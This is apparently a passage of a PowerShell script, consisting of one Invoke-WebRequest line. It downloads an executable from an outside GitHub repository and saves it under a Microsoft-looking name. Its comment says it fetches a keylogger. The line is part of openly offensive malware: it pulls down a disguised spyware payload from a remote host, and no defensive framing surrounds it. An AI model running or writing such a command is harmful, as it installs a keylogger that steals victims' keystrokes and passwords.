...
Invoke-WebRequest "https://github.com/Aroft-Developer/NBVCXWMLKJHGFDSQPOIUYTTREEZE/raw/main/MicrosoftStartFeed.exe" -OutFile "MicrosoftStarterFee.exe"#Download keylogger script
